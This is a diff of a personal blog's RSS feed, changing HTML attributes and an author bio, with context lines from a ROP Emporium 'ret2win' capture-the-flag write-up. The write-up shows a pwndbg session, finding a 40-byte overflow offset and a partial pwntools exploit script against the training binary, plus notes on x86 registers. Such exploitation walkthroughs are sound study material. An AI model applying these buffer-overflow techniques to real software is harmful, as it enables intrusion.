-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ret2win64 ➤ pwndbg ./ret2win
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ret2win64 ➤ pwndbg ./ret2win
 pwndbg: loaded &lt;span style="color:#ae81ff">193&lt;/span> commands. Type pwndbg &lt;span style="color:#f92672">[&lt;/span>filter&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> a list.
 pwndbg: created $rebase, $ida gdb functions &lt;span style="color:#f92672">(&lt;/span>can be used with print/break&lt;span style="color:#f92672">)&lt;/span>
 Reading symbols from ./ret2win...
@@ -1205,12 +1205,12 @@ pwndbg&amp;gt; x/wx $rsp
 0x7fffffffe8b8: 0x6161616b
 pwndbg&amp;gt; q
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Now lets find out the offset to overwrite the RIP&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">In &lt;span style="color:#f92672">[&lt;/span>1&lt;span style="color:#f92672">]&lt;/span>: from pwn import *
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">In &lt;span style="color:#f92672">[&lt;/span>1&lt;span style="color:#f92672">]&lt;/span>: from pwn import *
 In &lt;span style="color:#f92672">[&lt;/span>2&lt;span style="color:#f92672">]&lt;/span>: cyclic_find&lt;span style="color:#f92672">(&lt;/span>0x6161616b&lt;span style="color:#f92672">)&lt;/span>
 Out&lt;span style="color:#f92672">[&lt;/span>2&lt;span style="color:#f92672">]&lt;/span>: &lt;span style="color:#ae81ff">40&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we know the offset is 40 let&amp;rsquo;s craft our exploit but we notice there&amp;rsquo;s actually a hint give the webpage saying&lt;/p>
 &lt;pre>&lt;code>It's worth confirming this before each challenge but typically you'll need 40 bytes of garbage to reach the saved return address in the 64bit binaries, 44 bytes in the 32bit binaries
-&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3 &lt;/span>
+&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3 &lt;/span>
 &lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
 context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;alacritty&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-c&amp;#39;&lt;/span>]
 context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;info&amp;#39;&lt;/span>
@@ -1220,7 +1220,7 @@ payload &lt;span style="color:#f92672">=&lt;/span> flat([cyclic(&lt;span style="
 io&lt;span style="color:#f92672">.&lt;/span>sendline(payload)
 io&lt;span style="color:#f92672">.&lt;/span>interactive()
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>so now we run the exploit to check if it works :)&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ret2win64 ➤ ./exploit
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ret2win64 ➤ ./exploit
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Documents/pwn/rop_emporium/0-ret2win/ret2win64/ret2win&amp;#39;&lt;/span>
 Arch: amd64-64-little
 RELRO: Partial RELRO
@@ -1270,7 +1270,7 @@ while execution of large values.(DX and DL)&lt;/p>
 &lt;pre>&lt;code>DI - destinaton index
 &lt;/code>&lt;/pre>
 &lt;p>The registers [ EAX, EBX, ECX, EDX ] can be used as subsections as shown in EAX, it contains a 16bit register AX which is split into two 8 bit registers again AH and AL&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">32-bit register &lt;span style="color:#f92672">[&lt;/span>EAX, EBX, ECX, EDX, ESI, EDI, ESP, or EBP&lt;span style="color:#f92672">]&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">32-bit register &lt;span style="color:#f92672">[&lt;/span>EAX, EBX, ECX, EDX, ESI, EDI, ESP, or EBP&lt;span style="color:#f92672">]&lt;/span>
 16-bit register &lt;span style="color:#f92672">[&lt;/span>AX, BX, CX, or DX&lt;span style="color:#f92672">]&lt;/span>
 8-bit register &lt;span style="color:#f92672">[&lt;/span>AH, BH, CH, DH, AL, BL, CL, or DL&lt;span style="color:#f92672">]&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>An assembly program can be split into three sections&lt;/p>
@@ -1342,13 +1342,13 @@ mul rbx ;; rax = rax * rbx = 0x2 * 0x2 = 0x4
 &lt;p>&lt;code>mov eax, 0x8003 ; dividend&lt;/code>&lt;/p>
 &lt;p>&lt;code>mov ecx, 0x100 ; divisor&lt;/code>&lt;/p>
 &lt;p>&lt;code>div ecx ; EAX = 0x80, EDX = 0x3&lt;/code>&lt;/p></content></item><item><title/><link>/about/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/about/</guid><description>Hello there! I&amp;rsquo;m jones martin better known as h4x5p4c3
-Who Am I? I&amp;rsquo;m a 12th grade high schooler
+Who Am I? I&amp;rsquo;m a computer science undergrad at Sathyabama University
 What Do I Do? I&amp;rsquo;m very much instrested in reverse engineering and binary exploitation. I play CTF&amp;rsquo;s with zh3r0
-Anythin else? I love customizing linux and im fond of tiling window managers and i love kitty kats :P
+Anythin else? I love customizing linux and im fond of tiling window managers
 How To Reach Me Out? Discord - h4x5p4c3#7079</description><content>&lt;h2 id="hello-there">Hello there!&lt;/h2>
 &lt;p>I&amp;rsquo;m &lt;strong>jones martin&lt;/strong> better known as &lt;code>h4x5p4c3&lt;/code>&lt;/p>
-&lt;p>&lt;strong>Who Am I?&lt;/strong> I&amp;rsquo;m a 12th grade high schooler&lt;/p>
+&lt;p>&lt;strong>Who Am I?&lt;/strong> I&amp;rsquo;m a computer science undergrad at Sathyabama University&lt;/p>
 &lt;p>&lt;strong>What Do I Do?&lt;/strong> I&amp;rsquo;m very much instrested in reverse engineering and binary exploitation. I play &lt;a href="https://ctftime.org/about">CTF&amp;rsquo;s&lt;/a>
 with &lt;a href="https://www.zh3r0.com/">zh3r0&lt;/a>&lt;/p>
-&lt;p>&lt;strong>Anythin else?&lt;/strong> I love customizing linux and im fond of tiling window managers and i love kitty kats :P&lt;/p>
+&lt;p>&lt;strong>Anythin else?&lt;/strong> I love customizing linux and im fond of tiling window managers&lt;/p>
 &lt;p>&lt;strong>How To Reach Me Out?&lt;/strong> &lt;code>Discord - h4x5p4c3#7079&lt;/code>&lt;/p></content></item></channel></rss>
